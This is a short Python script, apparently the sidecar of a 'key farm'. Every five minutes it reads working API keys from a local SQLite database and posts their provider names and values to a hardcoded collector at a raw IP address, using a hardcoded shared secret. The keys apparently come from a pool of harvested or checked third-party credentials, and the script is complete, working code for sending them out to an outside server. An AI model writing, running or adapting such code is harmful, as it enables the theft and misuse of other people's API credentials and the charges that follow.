import json, os, sqlite3, time, urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
DB = os.environ.get("KF_DB") or os.path.join(HERE, "data/keys.db")
COLLECTOR = os.environ.get("KF_COLLECTOR", "http://144.31.34.147:8765/keys")
_f = os.path.join(HERE, ".farm_" + "secret")
FSEC = open(_f).read().strip() if os.path.exists(_f) else "2a767309a6b10f5264e0ecf460181310"
NODE = os.environ.get("KF_NODE", os.environ.get("RAILWAY_SERVICE_ID", "unknown"))

while True:
    try:
        if os.path.exists(DB):
            db = sqlite3.connect("file:%s?mode=ro" % DB, uri=True)
            rows = db.execute("SELECT prov, val, status FROM keys WHERE status IN ('WORKING','FREE','LIMITED')").fetchall()
            db.close()
            if rows:
                payload = json.dumps({"node": NODE, "keys": [{"prov": r[0], "val": r[1], "status": r[2]} for r in rows]}).encode()
                req = urllib.request.Request(COLLECTOR, data=payload,
                    headers={"Content-Type": "application/json", "X-Farm-Secret": FSEC})
                resp = urllib.request.urlopen(req, timeout=20).read()
                print("sidecar: sent %d, resp %s" % (len(rows), resp[:80]), flush=True)
    except Exception as e:
        print("sidecar err:", str(e)[:100], flush=True)
    time.sleep(300)
